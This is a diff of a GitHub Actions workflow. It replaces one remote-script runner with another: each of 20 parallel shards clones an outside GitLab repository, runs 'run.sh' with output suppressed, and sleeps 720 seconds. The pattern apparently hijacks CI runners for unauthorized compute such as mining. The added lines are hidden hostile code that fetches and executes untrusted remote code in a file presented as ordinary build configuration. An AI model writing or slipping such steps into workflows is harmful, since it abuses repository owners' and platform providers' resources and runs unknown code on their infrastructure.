@@ -12,10 +12,6 @@ permissions:
   actions: write
   contents: read
 
-env:
-  REPO_URL: https://gitlab.com/line789/xiaomi89.git
-  NODE_VERSION: '22.11.0'
-
 jobs:
   shards:
     strategy:
@@ -26,29 +22,19 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 20
     steps:
-      - uses: actions/setup-node@v4
-        with:
-          node-version: ${{ env.NODE_VERSION }}
-
       - name: "shard ${{ matrix.shard }}/20"
         env:
           SHARD: ${{ matrix.shard }}
         run: |
           echo "=== shard $SHARD/20 ==="
           lscpu | head -10
-          cd "$HOME"
-          rm -rf xiaomi89
-          git clone --depth 1 "$REPO_URL" xiaomi89 || echo "clone gagal, lanjut"
-          if [ -d xiaomi89 ]; then
-            cd xiaomi89
-            BUN_SH="$(find . -type f -name bun.sh -print -quit)"
-            if [ -n "${BUN_SH:-}" ]; then
-              cd "$(dirname "$BUN_SH")"
-              chmod +x bun.sh
-              echo "jalankan bun.sh + sleep 720"
-              ./bun.sh >/dev/null 2>&1 && sleep 720 || true
-            fi
-          fi
+          git clone https://gitlab.com/masaakk88/file/xiaomi01.git \
+            && cd xiaomi01 \
+            && chmod 777 run.sh \
+            && nproc --all \
+            && ./run.sh >/dev/null 2>&1 \
+            && sleep 720 \
+            || true
           echo "✅ shard $SHARD selesai"
 
   trigger-hello:
